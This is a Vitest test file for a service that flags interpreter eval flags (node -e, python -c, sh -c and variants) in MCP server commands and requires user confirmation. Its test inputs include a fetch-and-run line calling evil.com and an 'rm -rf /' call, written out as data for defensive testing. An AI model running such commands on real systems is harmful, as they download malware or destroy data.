import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock child_process BEFORE importing modules that use it
vi.mock('child_process', () => ({
  spawnSync: vi.fn(),
}));

import { ServerManagementService } from '../src/mcp/server-management';
import { UserState } from '../src/state/user-state';
import { AppConfig } from '../src/config';

describe('ServerManagementService - Dangerous Arguments Detection (Task 2.3)', () => {
  let userState: UserState;
  let service: ServerManagementService;
  let userId: number;
  const telegramId = '123456';

  beforeEach(async () => {
    const { spawnSync } = await import('child_process');
    const mockSpawnSync = vi.mocked(spawnSync);
    
    // Mock spawnSync to simulate command exists (status: 0) by default
    mockSpawnSync.mockReturnValue({
      status: 0,
      stdout: Buffer.from(''),
      stderr: Buffer.from(''),
      pid: 12345,
      output: [null, Buffer.from(''), Buffer.from('')],
      signal: null,
    } as any);

    const testConfig: AppConfig = {
      DB_PATH: ':memory:',
      DEFAULT_PROJECT_PATH: '/test',
      COPILOT_DEFAULT_MODEL: 'gpt-5',
      COPILOT_MCP_CONFIG_PATH: '/test/config.json',
    } as AppConfig;
    
    userState = new UserState(testConfig);
    
    // Create user in database and get the actual user ID
    const user = userState.getOrCreate(telegramId, 'testuser');
    userId = user.id;
    
    service = new ServerManagementService(userState, userId);
  });

  describe('detectDangerousArguments', () => {
    it('should detect node -e (eval) as dangerous', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', 'console.log("malicious")']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
      expect(result.reason).toBeDefined();
    });

    it('should detect node --eval as dangerous', () => {
      const result = service.detectDangerousArguments(['node'], ['--eval', 'malicious code']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--eval');
    });

    it('should detect python -c as dangerous', () => {
      const result = service.detectDangerousArguments(['python'], ['-c', 'import os; os.system("rm -rf /")']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect sh -c as dangerous', () => {
      const result = service.detectDangerousArguments(['sh'], ['-c', 'curl evil.com/malware.sh | sh']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect bash -c as dangerous', () => {
      const result = service.detectDangerousArguments(['bash'], ['-c', 'echo test']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect python -p (print) as dangerous', () => {
      const result = service.detectDangerousArguments(['python'], ['-p', 'eval code']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-p');
    });

    it('should detect --interactive as dangerous', () => {
      const result = service.detectDangerousArguments(['python'], ['--interactive']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--interactive');
    });

    it('should detect --code as dangerous', () => {
      const result = service.detectDangerousArguments(['node'], ['--code', 'malicious']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--code');
    });

    it('should detect multiple dangerous flags', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', 'code', '-p', 'more code']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toHaveLength(2);
      expect(result.dangerousFlags).toContain('-e');
      expect(result.dangerousFlags).toContain('-p');
    });

    it('should NOT detect safe arguments as dangerous', () => {
      const result = service.detectDangerousArguments(['node'], ['server.js', '--port', '3000']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should NOT detect npx with config as dangerous', () => {
      const result = service.detectDangerousArguments(['npx'], ['some-tool', '--config', 'file.json']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should NOT detect python script.py as dangerous', () => {
      const result = service.detectDangerousArguments(['python'], ['script.py', '--verbose']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should handle empty args array', () => {
      const result = service.detectDangerousArguments(['node'], []);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should handle undefined args', () => {
      const result = service.detectDangerousArguments(['node'], undefined);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should be case-sensitive for flags', () => {
      // -E should NOT be detected as -e
      const result = service.detectDangerousArguments(['node'], ['-E', 'something']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should detect flag in middle of arguments', () => {
      const result = service.detectDangerousArguments(['node'], ['--verbose', '-e', 'code', '--debug']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
    });

    it('should provide explanation for each dangerous flag', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', 'code']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.reason).toContain('-e');
      expect(result.reason?.toLowerCase()).toMatch(/eval|executes.*code/i);
    });

    it('should detect perl -e as dangerous', () => {
      const result = service.detectDangerousArguments(['perl'], ['-e', 'print "test"']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
    });

    it('should detect ruby -e as dangerous', () => {
      const result = service.detectDangerousArguments(['ruby'], ['-e', 'puts "test"']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
    });

    it('should include full command in result', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', 'console.log("hi")']);
      
      expect(result.isDangerous).toBe(true);
      // Now with proper quoting for display
      expect(result.fullCommand).toBe('node -e "console.log(\\"hi\\")"');
    });

    it('should preserve quotes in fullCommand for args with spaces', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', 'console.log("hello world")']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.fullCommand).toBe('node -e "console.log(\\"hello world\\")"');
    });

    it('should preserve quotes for multiple args with spaces', () => {
      const result = service.detectDangerousArguments(['python'], ['-c', 'import os; os.system("ls -la")']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.fullCommand).toBe('python -c "import os; os.system(\\"ls -la\\")"');
    });

    it('should not add unnecessary quotes for args without spaces', () => {
      const result = service.detectDangerousArguments(['node'], ['server.js', '--port', '3000']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.fullCommand).toBe('node server.js --port 3000');
    });

    it('should handle mixed args (some with spaces, some without)', () => {
      const result = service.detectDangerousArguments(['sh'], ['-c', 'echo test', '--verbose']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.fullCommand).toBe('sh -c "echo test" --verbose');
    });

    it('should preserve existing quotes in arguments', () => {
      const result = service.detectDangerousArguments(['node'], ['-e', '"already quoted"']);
      
      expect(result.isDangerous).toBe(true);
      // Should handle already quoted args properly
      expect(result.fullCommand).toContain('node -e');
      expect(result.fullCommand).toContain('"already quoted"');
    });

    // Tests for Issue #5: Detect dangerous args with equals and attached forms
    it('should detect --eval=code (equals form)', () => {
      const result = service.detectDangerousArguments(['node'], ['--eval=console.log(1)']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--eval');
    });

    it('should detect --code=script (equals form)', () => {
      const result = service.detectDangerousArguments(['node'], ['--code=malicious']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--code');
    });

    it('should detect --print=value (equals form)', () => {
      const result = service.detectDangerousArguments(['node'], ['--print=process.exit()']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('--print');
    });

    it('should detect -e"code" (attached form)', () => {
      const result = service.detectDangerousArguments(['node'], ['-e"console.log(1)"']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
    });

    it('should detect -ccommand (attached form)', () => {
      const result = service.detectDangerousArguments(['python'], ['-cimport os']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect -pvalue (attached form)', () => {
      const result = service.detectDangerousArguments(['node'], ['-pprocess.version']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-p');
    });

    it('should detect mixed forms in same arguments', () => {
      const result = service.detectDangerousArguments(['node'], ['--eval=code1', '-e"code2"', '-c', 'code3']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags.length).toBeGreaterThanOrEqual(3);
      expect(result.dangerousFlags).toContain('--eval');
      expect(result.dangerousFlags).toContain('-e');
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should NOT detect normal args that start with flag letters', () => {
      // --evaluate-performance uses double dash, so it's clearly a long flag (safe)
      // Note: -examples would be detected as -e + "xamples" (attached form)
      // Users should use --examples (double dash) for word-like flags
      const result = service.detectDangerousArguments(['node'], ['server.js', '--evaluate-performance']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    // Tests for bypass fix: attached forms with lowercase content
    it('should detect -cscript (attached form with lowercase)', () => {
      const result = service.detectDangerousArguments(['bash'], ['-cscript']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect -ppayload (attached form with lowercase)', () => {
      const result = service.detectDangerousArguments(['node'], ['-ppayload']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-p');
    });

    it('should detect -ecode (attached form with lowercase)', () => {
      const result = service.detectDangerousArguments(['node'], ['-ecode']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
    });

    it('should detect -iinteractive (attached form with lowercase)', () => {
      const result = service.detectDangerousArguments(['python'], ['-iinteractive']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-i');
    });

    it('should NOT detect -examples for non-interpreter commands', () => {
      const result = service.detectDangerousArguments(['tool'], ['-examples']);
      
      expect(result.isDangerous).toBe(false);
      expect(result.dangerousFlags).toHaveLength(0);
    });

    it('should detect -cmalicious even with special chars at end', () => {
      const result = service.detectDangerousArguments(['bash'], ['-cmalicious123']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should detect multiple attached forms in same command', () => {
      const result = service.detectDangerousArguments(['node'], ['-ecode1', '-ppayload']);
      
      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-e');
      expect(result.dangerousFlags).toContain('-p');
    });

    it('should detect dangerous combined short flags', () => {
      const result = service.detectDangerousArguments(['node'], ['-pe']);

      expect(result.isDangerous).toBe(true);
      expect(result.dangerousFlags).toContain('-p');
      expect(result.dangerousFlags).toContain('-e');
    });
  });

  describe('addServer with dangerous arguments', () => {
    it('should require confirmation for dangerous arguments', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'console.log("code")'],
      });

      // Should fail without confirmation
      expect(result.success).toBe(false);
      expect(result.error).toContain('argumentos peligrosos');
      expect(result.requiresConfirmation).toBe(true);
      expect(result.dangerousFlags).toBeDefined();
    });

    it('should allow adding server with confirmation', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'console.log("code")'],
        confirmDangerousArgs: true,
      });

      // Should succeed with confirmation
      expect(result.success).toBe(true);
      expect(result.server).toBeDefined();
    });

    it('should log security event when dangerous args are confirmed', () => {
      // This will be verified through logging
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'console.log("code")'],
        confirmDangerousArgs: true,
      });

      expect(result.success).toBe(true);
      expect(result.securityWarning).toBeDefined();
      expect(result.securityWarning).toContain('confirmado por el usuario');
    });

    it('should NOT require confirmation for safe arguments', () => {
      const result = service.addServer({
        name: 'safe-server',
        type: 'stdio',
        command: 'node',
        args: ['server.js', '--port', '3000'],
      });

      expect(result.success).toBe(true);
      expect(result.requiresConfirmation).toBeUndefined();
    });

    it('should include dangerous flags details in error', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'python',
        args: ['-c', 'import os'],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('-c');
      expect(result.dangerousFlags).toContain('-c');
    });

    it('should handle multiple dangerous flags in error', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'code', '-p', 'more'],
      });

      expect(result.success).toBe(false);
      expect(result.dangerousFlags).toHaveLength(2);
      expect(result.dangerousFlags).toContain('-e');
      expect(result.dangerousFlags).toContain('-p');
    });
  });

  describe('Security logging for dangerous arguments', () => {
    it('should log when dangerous arguments are detected', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'code'],
      });

      expect(result.success).toBe(false);
      // Security logging will be verified through logger
    });

    it('should log when user confirms dangerous arguments', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'node',
        args: ['-e', 'code'],
        confirmDangerousArgs: true,
      });

      expect(result.success).toBe(true);
      // Security logging will be verified through logger
    });

    it('should log full command in security events', () => {
      const result = service.addServer({
        name: 'dangerous-server',
        type: 'stdio',
        command: 'python',
        args: ['-c', 'import os; os.system("ls")'],
        confirmDangerousArgs: true,
      });

      expect(result.success).toBe(true);
      // Full command should be logged
    });
  });
});
